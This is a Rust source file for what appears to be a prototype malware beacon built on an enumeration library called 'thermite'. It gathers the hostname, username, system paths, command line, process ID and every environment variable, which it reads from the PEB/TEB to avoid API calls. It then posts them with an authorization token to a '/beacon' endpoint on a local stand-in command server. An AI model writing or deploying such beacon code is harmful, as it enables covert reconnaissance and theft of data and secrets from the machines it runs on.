#[allow(unused)]
use core::mem;
use reqwest::blocking::Client;

use thermite::enumeration::*;
use serde::{Deserialize, Serialize};


#[derive(Debug, Deserialize, Serialize, Clone)]
struct BasicInfo {
	hostname: String,
	username: String,
	tmpdir: String,
	appdata: String,
	windir: String,
	cwd: String,
	cmdline: String,
	pid: u64,
	env: Vec<String>,
}


fn main() -> Result<(), String> {
	// Retrieve system process info
	// let sys_proc_info_ptr = processes::get_process_info();

	// Enumerate all processes
	// let processes = processes::enumerate_processes(sys_proc_info_ptr).iter().map(|(_, _, proc_info_ptr)| unsafe {
	// 	Process::new(proc_info_ptr.cast_const())
	// }).collect();

	let (cmdline, cwd, env) = unsafe { (get_command_line(), get_current_directory(), get_environment()) };
	
	// All this information is gathered by reading the PEB/TEB, no API calls needed
	let data = BasicInfo {
		hostname: get_computer_name(),
		username: get_username(),
		tmpdir: get_temp(),
		appdata: get_appdata(),
		windir: get_windir(),
		cwd,
		cmdline,
		pid: get_process_id(),
		env,
	};

	let client = Client::new();
	let res =  client
		.post("http://localhost:3000/beacon")
		.header("Authorization", "51d10216-2daf-41eb-a9ca-a8da3a3cc924")
		.json(&data)
		.send().map_err(|e| e.to_string())?;
	println!("{:?}",res.text().map_err(|e| e.to_string())?);
	Ok(())

}


